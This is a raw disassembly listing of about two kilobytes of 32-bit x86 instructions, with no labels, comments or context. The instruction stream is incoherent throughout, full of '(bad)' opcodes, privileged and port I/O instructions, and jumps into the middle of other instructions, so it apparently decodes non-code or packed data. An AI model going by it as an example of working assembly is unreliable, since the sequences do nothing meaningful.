  41f565:	or     ebp,0x7fea047d
  41f56b:	and    al,0xd3
  41f56d:	and    al,0x7
  41f56f:	shr    BYTE PTR [edx+ebp*8+0x4e0bc7dd],0x18
  41f577:	pop    ss
  41f578:	mov    ah,0x23
  41f57a:	loope  0x41f509
  41f57c:	clc    
  41f57d:	adc    BYTE PTR [edx-0x3d],dh
  41f580:	push   ecx
  41f581:	test   eax,0xce6d4820
  41f586:	sar    DWORD PTR [eax-0x5db5cf71],0x7
  41f58d:	mov    bl,0x7a
  41f58f:	pop    eax
  41f590:	fs adc al,0x35
  41f593:	jecxz  0x41f5ac
  41f595:	pop    eax
  41f596:	icebp  
  41f597:	test   ebx,0x207445e6
  41f59d:	mul    BYTE PTR gs:[eax]
  41f5a0:	jle    0x41f5d1
  41f5a2:	sar    BYTE PTR ds:0x3482bc40,cl
  41f5a8:	lahf   
  41f5a9:	bound  edx,QWORD PTR [esi]
  41f5ab:	push   edi
  41f5ac:	shr    BYTE PTR [ebx+0x48c92928],cl
  41f5b2:	into   
  41f5b3:	push   cs
  41f5b4:	mov    fs,WORD PTR [esi+0x51]
  41f5b7:	mov    al,ds:0x30647b4
  41f5bc:	pop    esp
  41f5bd:	mov    ebx,0xeea219e2
  41f5c2:	add    DWORD PTR [ebp-0x49],ecx
  41f5c5:	pand   mm2,QWORD PTR [ebx-0x2b]
  41f5c9:	xor    al,0xe2
  41f5cb:	ss js  0x41f5e3
  41f5ce:	mov    esp,0x342b3a5b
  41f5d3:	cmc    
  41f5d4:	xchg   ebx,eax
  41f5d5:	adc    DWORD PTR [edi-0x14c1d06b],ebx
  41f5db:	mov    eax,0x4403c120
  41f5e0:	dec    ebp
  41f5e1:	jne    0x41f62d
  41f5e3:	cli    
  41f5e4:	stc    
  41f5e5:	pop    edi
  41f5e6:	pop    ecx
  41f5e7:	(bad)  
  41f5e8:	sbb    esp,edx
  41f5ea:	(bad)  [ebp+0x6d244b87]
  41f5f0:	pop    edx
  41f5f1:	scas   al,BYTE PTR es:[edi]
  41f5f2:	inc    esi
  41f5f3:	in     eax,dx
  41f5f4:	jmp    0x41f622
  41f5f6:	call   edi
  41f5f8:	dec    esi
  41f5f9:	xchg   edx,eax
  41f5fa:	mov    bl,0x3e
  41f5fc:	out    0x37,eax
  41f5fe:	jp     0x41f5db
  41f600:	sti    
  41f601:	scas   eax,DWORD PTR es:[edi]
  41f602:	dec    ecx
  41f603:	xor    eax,DWORD PTR [esi]
  41f605:	sbb    dh,BYTE PTR [ebx-0x3a]
  41f608:	loopne 0x41f5f9
  41f60a:	or     al,0x77
  41f60c:	mov    ch,0x7d
  41f60e:	xchg   ebp,eax
  41f60f:	popf   
  41f610:	addr16 dec ecx
  41f612:	sub    esi,edx
  41f614:	push   edi
  41f615:	mov    bl,ch
  41f617:	mov    dl,0x94
  41f619:	pop    ebp
  41f61a:	les    ecx,FWORD PTR [edi]
  41f61c:	in     eax,dx
  41f61d:	add    al,0x27
  41f61f:	retf   
  41f620:	stc    
  41f621:	mov    dh,0x4d
  41f623:	inc    ebx
  41f624:	and    BYTE PTR [ecx],al
  41f626:	sti    
  41f627:	push   0xffffff90
  41f629:	jno    0x41f640
  41f62b:	jle    0x41f5ec
  41f62d:	aaa    
  41f62e:	aad    0x95
  41f630:	sub    BYTE PTR [edx-0x7cd5c106],bh
  41f636:	stos   DWORD PTR es:[edi],eax
  41f637:	(bad)  
  41f638:	ds call 0x100e:0x47dcd4e
  41f640:	inc    edi
  41f641:	retf   
  41f642:	icebp  
  41f643:	dec    edx
  41f644:	push   esp
  41f645:	test   eax,0x140f2b3d
  41f64a:	cld    
  41f64b:	push   ss
  41f64c:	test   BYTE PTR [eax],al
  41f64e:	and    DWORD PTR [eax],ebp
  41f650:	sbb    BYTE PTR [eax+eiz*8+0x20],dl
  41f654:	xlat   BYTE PTR ds:[ebx]
  41f655:	test   edx,esp
  41f657:	aaa    
  41f658:	jecxz  0x41f5fc
  41f65a:	jno    0x41f621
  41f65c:	vmwrite esi,DWORD PTR [ebx]
  41f65f:	shl    BYTE PTR ds:0xdf079d8f,1
  41f665:	xor    eax,0x79437a95
  41f66a:	xchg   esi,eax
  41f66b:	dec    ebp
  41f66c:	pushf  
  41f66d:	add    eax,0xd40891da
  41f672:	cmp    al,0x7d
  41f674:	sub    bl,cl
  41f676:	repz call 0xa32b:0xced83607
  41f67e:	sar    BYTE PTR ss:[edi],1
  41f681:	mov    ebp,0xb7c85a36
  41f686:	push   edi
  41f687:	fdiv   DWORD PTR [ebp-0x23]
  41f68a:	xor    esi,DWORD PTR [ebx+edi*8+0x7f3775a1]
  41f691:	out    dx,al
  41f692:	ja     0x41f65a
  41f694:	pop    esp
  41f695:	cmp    ch,bl
  41f697:	push   ebx
  41f698:	jp     0x41f684
  41f69a:	push   esi
  41f69b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f69c:	les    eax,FWORD PTR [ebp+0x4a]
  41f69f:	xor    esp,edi
  41f6a1:	adc    edi,ebp
  41f6a3:	mov    bh,0x10
  41f6a5:	out    dx,al
  41f6a6:	faddp  st(5),st
  41f6a8:	gs out dx,eax
  41f6aa:	aam    0x11
  41f6ac:	mov    cl,BYTE PTR [ecx]
  41f6ae:	in     eax,0x12
  41f6b0:	out    dx,al
  41f6b1:	mov    ecx,0x170f97fe
  41f6b6:	pop    ss
  41f6b7:	scas   al,BYTE PTR es:[edi]
  41f6b8:	sub    DWORD PTR [eax+0x590f7f9a],eax
  41f6be:	pusha  
  41f6bf:	(bad)  
  41f6c0:	add    al,0x98
  41f6c2:	mov    al,0xd1
  41f6c4:	shl    bl,1
  41f6c6:	mov    edi,0x250a2f49
  41f6cb:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6cd:	hlt    
  41f6ce:	not    DWORD PTR [ebx]
  41f6d0:	int    0x15
  41f6d2:	mov    esp,DWORD PTR [ebx+0xf]
  41f6d5:	sub    ax,0x6e41
  41f6d9:	dec    ebx
  41f6da:	sahf   
  41f6db:	dec    edi
  41f6dc:	and    DWORD PTR [ecx+0x33f447bc],eax
  41f6e2:	adc    esi,DWORD PTR [edi+0xd]
  41f6e5:	pop    edi
  41f6e6:	push   cs
  41f6e7:	scas   al,BYTE PTR es:[edi]
  41f6e8:	add    edi,edx
  41f6ea:	retf   0x8223
  41f6ed:	ja     0x41f6d2
  41f6ef:	and    edi,DWORD PTR [ecx+0x6b]
  41f6f2:	lock adc edi,esp
  41f6f5:	dec    ebx
  41f6f6:	frstor [edi-0xe]
  41f6f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6fa:	mov    edx,0xce203902
  41f6ff:	inc    ebp
  41f700:	rcl    DWORD PTR [ecx],1
  41f702:	sub    bh,ah
  41f704:	repnz cmp cl,BYTE PTR [ebp+0x74]
  41f708:	sti    
  41f709:	inc    esi
  41f70a:	jecxz  0x41f788
  41f70c:	clc    
  41f70d:	mov    edx,0x6ff8757f
  41f712:	(bad)  
  41f713:	pop    ss
  41f714:	xchg   esp,eax
  41f715:	popa   
  41f716:	sahf   
  41f717:	and    eax,DWORD PTR [esp+eax*8-0x22a071ba]
  41f71e:	neg    DWORD PTR [ebp+0x1cc0716b]
  41f724:	stos   WORD PTR es:[edi],ax
  41f726:	je     0x41f759
  41f728:	sbb    bh,BYTE PTR [ebx+0x4a]
  41f72b:	(bad)  
  41f72c:	xchg   edi,eax
  41f72d:	sbb    al,0x6a
  41f72f:	call   0x42ec:0xf3ed384e
  41f736:	pop    es
  41f737:	arpl   WORD PTR [edx],si
  41f739:	push   ss
  41f73a:	cdq    
  41f73b:	leave  
  41f73c:	addr16 mov ah,0x46
  41f73f:	mov    dh,0x96
  41f741:	adc    al,0xc7
  41f743:	mov    bh,0x54
  41f745:	(bad)  
  41f746:	pushf  
  41f747:	dec    ebp
  41f748:	sub    BYTE PTR [eax+0x7b26c82a],ah
  41f74e:	ins    BYTE PTR es:[edi],dx
  41f74f:	nop
  41f750:	sar    BYTE PTR [ebx],cl
  41f752:	jge    0x41f777
  41f754:	mov    ch,0xd2
  41f756:	jns    0x41f720
  41f758:	or     esi,DWORD PTR [ecx-0x15d689f1]
  41f75e:	mov    eax,ds:0x12ad93c8
  41f763:	out    0x2a,al
  41f765:	pop    ss
  41f766:	and    DWORD PTR [edi-0x2e5e1671],edx
  41f76c:	aaa    
  41f76d:	cmp    al,0x72
  41f76f:	adc    DWORD PTR [edx],ebp
  41f771:	mov    eax,0xd85b6dcc
  41f776:	adc    bl,BYTE PTR [ecx]
  41f778:	push   ss
  41f779:	fild   DWORD PTR [edx-0x76b38999]
  41f77f:	xor    ch,BYTE PTR [edx+ecx*1-0x638aa88f]
  41f786:	in     al,dx
  41f787:	mov    fs,WORD PTR [eax+0x784820b0]
  41f78d:	dec    ebx
  41f78e:	cmp    dl,bh
  41f790:	dec    ebp
  41f791:	mov    ds:0x8d73ad81,al
  41f796:	sar    esi,cl
  41f798:	lods   eax,DWORD PTR gs:[esi]
  41f79a:	out    0x57,eax
  41f79c:	ins    BYTE PTR es:[edi],dx
  41f79d:	mov    ds:0xf9bd243e,al
  41f7a2:	add    cl,BYTE PTR [esi]
  41f7a4:	xchg   edx,eax
  41f7a5:	adc    ebp,ebx
  41f7a7:	arpl   dx,bp
  41f7a9:	mov    ecx,0xcd80bdb7
  41f7ae:	pop    es
  41f7af:	nop
  41f7b0:	mov    DWORD PTR ds:0xcec2f589,esp
  41f7b6:	cmp    ch,BYTE PTR [esi-0x14]
  41f7b9:	lods   al,BYTE PTR ds:[esi]
  41f7ba:	lea    ebp,[ebx]
  41f7bc:	pop    edx
  41f7bd:	mov    ebx,0xf9764908
  41f7c2:	xchg   ebx,eax
  41f7c3:	rcr    ebp,cl
  41f7c5:	or     bl,ch
  41f7c7:	sbb    al,0x96
  41f7c9:	pop    edi
  41f7ca:	pushf  
  41f7cb:	mov    dh,0x21
  41f7cd:	aad    0x6d
  41f7cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7d0:	xor    DWORD PTR [eax-0x20],0xffffffed
  41f7d4:	mov    esi,DWORD PTR [ebp-0xd]
  41f7d7:	or     edi,esp
  41f7d9:	inc    esi
  41f7da:	jg     0x41f82e
  41f7dc:	cmp    BYTE PTR [ecx+0x8],dh
  41f7df:	out    0x56,al
  41f7e1:	adc    DWORD PTR [ebx],esi
  41f7e3:	or     DWORD PTR [ebx+0x5],ebp
  41f7e6:	jbe    0x41f841
  41f7e8:	sbb    al,0xdb
  41f7ea:	(bad)  
  41f7eb:	ss test eax,0x17b80a12
  41f7f1:	jne    0x41f810
  41f7f3:	data16 jl 0x41f7b5
  41f7f6:	cs stc 
  41f7f8:	(bad)  
  41f7f9:	nop
  41f7fa:	lahf   
  41f7fb:	adc    esp,ebx
  41f7fd:	xchg   esi,eax
  41f7fe:	sbb    al,0x78
  41f800:	inc    ebp
  41f801:	fild   DWORD PTR [eax+0x19]
  41f804:	adc    edx,DWORD PTR [esi-0x5]
  41f807:	push   ebp
  41f808:	outs   dx,BYTE PTR ds:[esi]
  41f809:	sbb    al,0x4e
  41f80b:	push   ebp
  41f80c:	jl     0x41f81f
  41f80e:	mov    DWORD PTR [ebp-0x19],edx
  41f811:	or     al,0x4a
  41f813:	cli    
  41f814:	dec    edx
  41f815:	push   esi
  41f816:	lea    edi,[edx+0x64733461]
  41f81c:	out    dx,eax
  41f81d:	cdq    
  41f81e:	mov    edi,0x84b241b4
  41f823:	add    dh,BYTE PTR gs:[eax-0x5ae4a533]
  41f82a:	sub    eax,0xa175f7a
  41f82f:	xchg   ebx,eax
  41f830:	xchg   ebp,eax
  41f831:	push   ds
  41f832:	mov    ebx,0x4465453a
  41f837:	popf   
  41f838:	cli    
  41f839:	or     BYTE PTR ds:0x5c43a828,0xcb
  41f840:	call   0xf1c2:0x6ba84c8d
  41f847:	mov    eax,0xcc863757
  41f84c:	jae    0x41f8c3
  41f84e:	cmc    
  41f84f:	inc    ebp
  41f850:	jnp    0x41f83a
  41f852:	lock sub eax,0x9beb523e
  41f858:	in     eax,dx
  41f859:	dec    ebx
  41f85a:	pusha  
  41f85b:	adc    al,0x2c
  41f85d:	into   
  41f85e:	push   DWORD PTR ds:0xc81152f8
  41f864:	mov    cl,BYTE PTR [eax-0x7de17d01]
  41f86a:	xchg   ecx,eax
  41f86b:	loop   0x41f87b
  41f86d:	std    
  41f86e:	xchg   esp,eax
  41f86f:	(bad)  
  41f870:	out    dx,eax
  41f871:	jbe    0x41f8d4
  41f873:	and    bh,0x33
  41f876:	mov    edi,0x2cb17a9f
  41f87b:	jmp    0xaf1e3db8
  41f880:	out    0xb7,eax
  41f882:	(bad)  
  41f883:	and    al,0xe6
  41f885:	fwait
  41f886:	push   ss
  41f887:	inc    esp
  41f888:	or     al,0x83
  41f88a:	imul   esi,ebx,0x81b4fa71
  41f890:	fwait
  41f891:	xchg   BYTE PTR [eax+0x2b90602e],ch
  41f897:	bound  ebp,QWORD PTR [esi+0x1155e9c1]
  41f89d:	xor    eax,0xdb01dc3a
  41f8a2:	xor    DWORD PTR [ebx+0x2ed7f282],eax
  41f8a8:	retf   0xd711
  41f8ab:	xlat   BYTE PTR ds:[ebx]
  41f8ac:	push   ss
  41f8ad:	test   eax,0x5a6be033
  41f8b2:	jmp    0x41f88e
  41f8b4:	pop    esi
  41f8b5:	fld    QWORD PTR [ebp-0x1eb24820]
  41f8bb:	(bad)  
  41f8bc:	push   eax
  41f8bd:	cmp    eax,0x83121690
  41f8c2:	pop    ebp
  41f8c3:	pop    ds
  41f8c4:	jbe    0x41f8b3
  41f8c6:	pop    esp
  41f8c7:	clc    
  41f8c8:	and    eax,0x2410e623
  41f8cd:	fimul  DWORD PTR [esp+esi*8]
  41f8d0:	ja     0x41f89a
  41f8d2:	jge    0x41f8af
  41f8d4:	dec    esp
  41f8d5:	repnz cdq 
  41f8d7:	mov    esp,0x3fd55a79
  41f8dc:	jp     0x41f94f
  41f8de:	shl    dl,cl
  41f8e0:	(bad)  
  41f8e1:	lods   eax,DWORD PTR ds:[esi]
  41f8e2:	imul   ebx,DWORD PTR [eax+0x7b],0x50f386e1
  41f8e9:	xchg   esi,eax
  41f8ea:	test   BYTE PTR [ebp+0x44db8463],0xef
  41f8f1:	lods   eax,DWORD PTR ds:[esi]
  41f8f2:	out    dx,al
  41f8f3:	xor    BYTE PTR [ebx-0x7c],ah
  41f8f6:	loopne 0x41f8be
  41f8f8:	or     esi,DWORD PTR [eax]
  41f8fa:	repz jbe 0x41f977
  41f8fd:	cwde   
  41f8fe:	pop    edi
  41f8ff:	sbb    BYTE PTR [ebx-0xcfbf6e2],ah
  41f905:	xchg   edi,eax
  41f906:	in     eax,dx
  41f907:	out    dx,eax
  41f908:	into   
  41f909:	jo     0x41f922
  41f90b:	lods   eax,DWORD PTR ds:[esi]
  41f90c:	stos   DWORD PTR es:[edi],eax
  41f90d:	pop    ds
  41f90e:	popa   
  41f90f:	shl    BYTE PTR [edx+0x500da507],0x52
  41f916:	cdq    
  41f917:	aas    
  41f918:	inc    edx
  41f919:	dec    edi
  41f91a:	jg     0x41f8b0
  41f91c:	mov    ebp,0x9de80115
  41f921:	xor    ebp,DWORD PTR [edx]
  41f923:	xor    eax,0xfcebe312
  41f928:	cs nop
  41f92a:	(bad)  
  41f92c:	in     eax,0x69
  41f92e:	dec    esi
  41f92f:	jmp    FWORD PTR [edx-0x6e]
  41f932:	test   eax,0x6faeb9f
  41f937:	or     eax,0x4ef322cb
  41f93c:	pop    edi
  41f93d:	loop   0x41f990
  41f93f:	inc    esp
  41f940:	push   ebx
  41f941:	or     eax,0x553f5825
  41f946:	xor    DWORD PTR [edi+ecx*8-0x7ea295bb],edx
  41f94d:	idiv   BYTE PTR [ebx]
  41f94f:	not    BYTE PTR [ebp+0x3b9525c1]
  41f955:	add    DWORD PTR [ebx+0x7d103044],0x896e1748
  41f95f:	jmp    0x12c1:0xb5b13717
  41f966:	out    dx,eax
  41f967:	fst    QWORD PTR [eax+0x33e27d3e]
  41f96d:	add    ebx,0xffffffb6
  41f970:	fdivr  QWORD PTR [edi-0x76]
  41f973:	xor    bh,BYTE PTR [edi]
  41f975:	xor    DWORD PTR [ecx*4+0x7956732a],0xffffffe6
  41f97d:	add    esp,DWORD PTR ss:[esp+edx*1-0x25]
  41f982:	loopne 0x41f927
  41f984:	inc    ecx
  41f985:	out    0x1c,al
  41f987:	or     eax,0xfdc38708
  41f98c:	dec    edi
  41f98d:	fadd   DWORD PTR [ebx]
  41f98f:	ret    0x9b8d
  41f992:	mov    cl,0xbe
  41f994:	mov    ebx,0x83838301
  41f999:	inc    ebx
  41f99a:	sahf   
  41f99b:	mov    BYTE PTR [ebx-0x32],dh
  41f99e:	jp     0x41f92d
  41f9a0:	cld    
  41f9a1:	and    eax,0x9df3a47e
  41f9a6:	sbb    BYTE PTR [eax+0x1d],cl
  41f9a9:	cld    
  41f9aa:	popa   
  41f9ab:	sbb    eax,0x6419e7ae
  41f9b0:	loope  0x41f983
  41f9b2:	adc    bl,BYTE PTR [esi+0x39]
  41f9b5:	jae    0x41f9f0
  41f9b7:	jg     0x41f963
  41f9b9:	jl     0x41f9bc
  41f9bb:	jne    0x41fa33
  41f9bd:	jp     0x41f99c
  41f9bf:	xor    edi,ebp
  41f9c1:	inc    edx
  41f9c2:	sub    al,0x95
  41f9c4:	aad    0x83
  41f9c6:	lods   eax,DWORD PTR ds:[esi]
  41f9c7:	stos   BYTE PTR es:[edi],al
  41f9c8:	out    dx,al
  41f9c9:	dec    esp
  41f9ca:	test   esi,ebp
  41f9cc:	shl    ebx,0x34
  41f9cf:	xchg   DWORD PTR ss:[ebp-0x42],ebx
  41f9d3:	sbb    esp,DWORD PTR [edi+0x75]
  41f9d6:	push   es
  41f9d7:	bound  eax,QWORD PTR ds:[eax+eax*2+0x7a28efc0]
  41f9df:	and    eax,0x71a498a1
  41f9e4:	jbe    0x41fa4d
  41f9e6:	dec    esi
  41f9e7:	xor    eax,0x11d619a1
  41f9ec:	dec    DWORD PTR [ecx-0x46b7f4d1]
  41f9f2:	mov    dh,ch
  41f9f4:	fnstsw WORD PTR [esi-0x54]
  41f9f7:	sub    BYTE PTR [ebp-0x3b02bd65],cl
  41f9fd:	loope  0x41fa6f
  41f9ff:	ror    ebx,1
  41fa01:	xor    ah,BYTE PTR [edx+0x41]
  41fa04:	dec    ebx
  41fa05:	xor    BYTE PTR [edi+0x403f0b05],0x2e
  41fa0c:	adc    ah,al
  41fa0e:	push   es
  41fa0f:	dec    edx
  41fa10:	xlat   BYTE PTR ds:[ebx]
  41fa11:	fimul  WORD PTR [ecx-0x1e086b43]
  41fa17:	mov    edx,0x1b9ddb51
  41fa1c:	rcr    esi,0xc1
  41fa1f:	movaps xmm7,xmm7
  41fa22:	popa   
  41fa23:	push   ds
  41fa24:	and    al,0xa6
  41fa26:	movhlps xmm0,xmm5
  41fa29:	adc    al,0x91
  41fa2b:	in     eax,dx
  41fa2c:	xor    BYTE PTR [esi+0x50],al
  41fa2f:	adc    BYTE PTR [edi],bl
  41fa31:	sub    DWORD PTR [esi],ebp
  41fa33:	call   0x5343:0x4f59a943
  41fa3a:	fst    QWORD PTR [ebp+0x25]
  41fa3d:	rol    DWORD PTR [eax+esi*4+0x5d],cl
  41fa41:	and    al,0x13
  41fa43:	sbb    dl,BYTE PTR [eax+ebx*1]
  41fa46:	fs (bad) 
  41fa48:	repnz or ah,BYTE PTR [edi+0x63]
  41fa4c:	rcl    ah,cl
  41fa4e:	in     al,dx
  41fa4f:	(bad)  
  41fa51:	mov    ecx,0xd3324f1a
  41fa56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa57:	sbb    esi,DWORD PTR [ebp+0x2a5dfb98]
  41fa5d:	in     eax,dx
  41fa5e:	mov    WORD PTR [ecx+0x24],cs
  41fa61:	push   ebx
  41fa62:	outs   dx,DWORD PTR ds:[esi]
  41fa63:	ins    DWORD PTR es:[edi],dx
  41fa64:	mov    esp,0x358b1873
  41fa69:	xor    esi,DWORD PTR [ecx-0x8f5a77]
  41fa6f:	jnp    0x41fa12
  41fa71:	out    dx,eax
  41fa72:	pushf  
  41fa73:	out    0xde,eax
  41fa75:	rcr    BYTE PTR [ebx+edx*1-0x131a0e45],cl
  41fa7c:	adc    al,al
  41fa7e:	cmc    
  41fa7f:	adc    edx,DWORD PTR [ebx]
  41fa81:	outs   dx,DWORD PTR gs:[esi]
  41fa83:	xchg   BYTE PTR [eax-0x1d1f4e07],bl
  41fa89:	pop    esp
  41fa8a:	push   ds
  41fa8b:	jle    0x41fb04
  41fa8d:	fidiv  DWORD PTR [ecx]
  41fa8f:	aas    
  41fa90:	mov    cl,0xb2
  41fa92:	push   ds
  41fa93:	loopne 0x41fa9a
  41fa95:	outs   dx,DWORD PTR ds:[esi]
  41fa96:	jbe    0x41fa3a
  41fa98:	(bad)  [eax-0x385216b]
  41fa9e:	sbb    al,0x39
  41faa0:	sbb    ah,BYTE PTR [ebx+0x36]
  41faa3:	pop    eax
  41faa4:	mov    fs:0xed7f8aa1,eax
  41faaa:	arpl   WORD PTR fs:[eax+0x4b],ax
  41faae:	lahf   
  41faaf:	xchg   edx,eax
  41fab0:	cld    
  41fab1:	pop    edi
  41fab2:	mov    esp,0x70e6c8ce
  41fab7:	adc    DWORD PTR [esi-0xf],0x1f
  41fabb:	arpl   WORD PTR [ebx],bx
  41fabd:	sbb    al,0xc2
  41fabf:	imul   esp,DWORD PTR [edi-0x2228cc6c],0x96781698
  41fac9:	cmp    BYTE PTR [edx+0x1644b93c],ch
  41facf:	(bad)  
  41fad0:	and    DWORD PTR [ebp-0x27],edi
  41fad3:	fdivr  QWORD PTR [ebx+0x267a146c]
  41fad9:	inc    esi
  41fada:	cmp    al,0xb4
  41fadc:	inc    edi
  41fadd:	daa    
  41fade:	push   0x38ce5942
  41fae3:	add    al,0x37
  41fae5:	das    
  41fae6:	jnp    0x41fb13
  41fae8:	cli    
  41fae9:	mov    eax,ds:0xb6cb0f82
  41faee:	pop    ds
  41faef:	jecxz  0x41fb5b
  41faf1:	(bad)  
  41faf2:	int3   
  41faf3:	enter  0xe544,0xb6
  41faf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faf8:	push   ebx
  41faf9:	das    
  41fafa:	jbe    0x41fb58
  41fafc:	mov    bl,0xd0
  41fafe:	jg     0x41fab9
  41fb00:	push   es
  41fb01:	add    BYTE PTR [esi],bl
  41fb03:	cmp    BYTE PTR [ebx+ecx*2+0x4625290b],0xb8
  41fb0b:	push   edx
  41fb0c:	adc    DWORD PTR [esi+0x73e4d736],eax
  41fb12:	lods   al,BYTE PTR ds:[esi]
  41fb13:	frstor [esi-0x37]
  41fb16:	push   esp
  41fb17:	scas   al,BYTE PTR es:[edi]
  41fb18:	sub    dh,BYTE PTR [eax+0x56cabb9c]
  41fb1e:	mov    eax,ds:0x20f8f425
  41fb23:	pop    es
  41fb24:	imul   BYTE PTR [edx+0x45c54dd6]
  41fb2a:	in     eax,0x81
  41fb2c:	and    al,0x35
  41fb2e:	test   DWORD PTR [edi],0x62922500
  41fb34:	fwait
  41fb35:	loop   0x41fb38
  41fb37:	sbb    bh,0x5f
  41fb3a:	es lock mov ah,0x7
  41fb3e:	pop    ss
  41fb3f:	mov    edx,0x9063d2fd
  41fb44:	mov    edi,0xd3349c7
  41fb49:	aam    0x3c
  41fb4b:	fild   WORD PTR [esi+0x3d3fe128]
  41fb51:	fwait
  41fb52:	sbb    DWORD PTR [ebx],edx
  41fb54:	mov    ch,0xa6
  41fb56:	jo     0x41fb7b
  41fb58:	sbb    al,0xf6
  41fb5a:	sbb    edi,DWORD PTR [ecx+0x5cbdfc1e]
  41fb60:	stos   DWORD PTR es:[edi],eax
  41fb61:	cmp    eax,0x6338e3f9
  41fb66:	cdq    
  41fb67:	(bad)  
  41fb68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb69:	mov    ecx,0x6887e033
  41fb6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb6f:	cmp    DWORD PTR [esi],eax
  41fb71:	inc    eax
  41fb72:	push   ecx
  41fb73:	and    edi,DWORD PTR [ebp-0x56a5d2d4]
  41fb79:	(bad)  [ebp+edi*1+0x3a]
  41fb7d:	das    
  41fb7e:	sar    BYTE PTR [eax-0x41],0xb
  41fb82:	inc    esp
  41fb83:	or     DWORD PTR [edx],eax
  41fb85:	dec    edi
  41fb86:	inc    ebp
  41fb87:	xor    ecx,DWORD PTR [eax-0x68bc68e3]
  41fb8d:	add    ch,bl
  41fb8f:	cmp    eax,0xd742f59
  41fb94:	pop    esp
  41fb95:	loope  0x41fb8c
  41fb97:	adc    esp,0xf667d4e6
  41fb9d:	out    0xc4,eax
  41fb9f:	xchg   ecx,eax
  41fba0:	sub    DWORD PTR [edi],0x94d4c024
  41fba6:	test   al,0x58
  41fba8:	inc    edi
  41fba9:	pop    eax
  41fbaa:	lea    eax,[eax+0x5a53f4ca]
  41fbb0:	mov    al,0x81
  41fbb2:	fnstcw WORD PTR [eax]
  41fbb4:	cld    
  41fbb5:	cwde   
  41fbb6:	pop    ebx
  41fbb7:	aad    0xb8
  41fbb9:	aaa    
  41fbba:	mov    eax,ds:0x29e0f580
  41fbbf:	shl    bl,cl
  41fbc1:	xor    cl,BYTE PTR ds:0xcae1b4f8
  41fbc7:	jmp    FWORD PTR [esi+0x6d]
  41fbca:	jp     0x41fb5f
  41fbcc:	imul   edi,esi,0x15ee7f40
  41fbd2:	ret    0xe67c
  41fbd5:	xchg   DWORD PTR [ebp-0x6b],edi
  41fbd8:	dec    ecx
  41fbd9:	add    al,bl
  41fbdb:	jl     0x41fc48
  41fbdd:	and    esp,DWORD PTR [esi]
  41fbdf:	cwde   
  41fbe0:	adc    al,0xf8
  41fbe2:	mov    eax,ds:0x8883f463
  41fbe7:	lea    edi,[esi-0x2f1d38e2]
  41fbed:	mov    ebp,0x4e488195
  41fbf2:	and    edx,ebp
  41fbf4:	xor    DWORD PTR [eax+0x7db52e6e],edi
  41fbfa:	jle    0x41fc24
  41fbfc:	pop    ds
  41fbfd:	loope  0x41fbc3
  41fbff:	xor    cl,dh
  41fc01:	lea    esp,[edi+0x3a313d5]
  41fc07:	jo     0x41fc24
  41fc09:	es push es
  41fc0b:	popa   
  41fc0c:	add    DWORD PTR [edx],esi
  41fc0e:	push   ecx
  41fc0f:	xchg   DWORD PTR [edx+0x133b98c8],ecx
  41fc15:	add    eax,esi
  41fc17:	jle    0x41fc39
  41fc19:	or     ah,BYTE PTR [ebx+0x47]
  41fc1c:	mov    gs,WORD PTR [edx+edx*8+0x38]
  41fc20:	(bad)  
  41fc22:	shl    BYTE PTR [edx+ecx*4-0x532416ed],0xfd
  41fc2a:	xor    bl,cl
  41fc2c:	not    DWORD PTR [ebp+edx*1+0x761a995d]
  41fc33:	cmp    BYTE PTR [ecx],dh
  41fc35:	in     al,dx
  41fc36:	repz add eax,DWORD PTR [esp+edi*8]
  41fc3a:	jle    0x41fc44
  41fc3c:	xor    BYTE PTR [edi+0x25584061],0x2
  41fc43:	sar    DWORD PTR [edx],0xe2
  41fc46:	mov    es,WORD PTR [edi]
  41fc48:	addr16 xchg edi,eax
  41fc4a:	xchg   ecx,eax
  41fc4b:	fst    DWORD PTR [esp+ecx*2+0xb]
  41fc4f:	(bad)  
  41fc50:	or     ch,cl
  41fc52:	jmp    0xa67198f1
  41fc57:	push   cs
  41fc58:	jb     0x41fcae
  41fc5a:	sbb    cl,dl
  41fc5c:	(bad)  
  41fc5d:	add    BYTE PTR [eax+0x239aa2c9],dl
  41fc63:	mov    edi,0xa4cc3e32
  41fc68:	bound  ecx,QWORD PTR [ebx+eiz*2-0x2e282b71]
  41fc6f:	pop    es
  41fc70:	leave  
  41fc71:	sbb    ebx,DWORD PTR ds:0x36b69c32
  41fc77:	nop
  41fc78:	jno    0x41fcb7
  41fc7a:	std    
  41fc7b:	call   0x80b47caf
  41fc80:	mov    esi,0x430b5c6b
  41fc85:	or     ebx,DWORD PTR [edx-0x7f]
  41fc88:	add    DWORD PTR [edx+0x5b],ebx
  41fc8b:	mov    ecx,DWORD PTR ds:0x9bd87cae
  41fc91:	mov    ch,0x75
  41fc93:	cmp    ebp,DWORD PTR [esi+eax*1+0x42b1229e]
  41fc9a:	shr    bl,0xc2
  41fc9d:	shl    BYTE PTR [eax+0x494c5322],1
  41fca3:	sub    BYTE PTR [ebp+0x74491ff6],bl
  41fca9:	push   eax
  41fcaa:	aad    0x5c
  41fcac:	inc    edx
  41fcad:	sbb    al,0x95
  41fcaf:	mov    ss,edx
  41fcb1:	repz ja 0x41fd08
  41fcb4:	adc    DWORD PTR [edi-0x7c],ebx
  41fcb7:	xchg   ebx,eax
  41fcb8:	or     eax,0x6414acdd
  41fcbd:	rcl    DWORD PTR [eax-0x4b],cl
  41fcc0:	add    dh,al
  41fcc2:	jge    0x41fc98
  41fcc4:	sahf   
  41fcc5:	stc    
  41fcc6:	inc    eax
  41fcc7:	or     al,0xff
  41fcc9:	(bad)  
  41fcca:	data16 stos BYTE PTR es:[edi],al
  41fccc:	sahf   
  41fccd:	jmp    0xe58b8db
  41fcd2:	mov    DWORD PTR [ecx],esp
  41fcd4:	stc    
  41fcd5:	dec    eax
  41fcd6:	sbb    eax,0xf3a1502c
  41fcdb:	and    ebp,eax
  41fcdd:	leave  
  41fcde:	fwait
  41fcdf:	xor    al,0x6d
  41fce1:	out    dx,al
  41fce2:	pop    ebp
  41fce3:	das    
  41fce4:	aaa    
  41fce5:	in     al,dx
  41fce6:	or     eax,0xdf1a9141
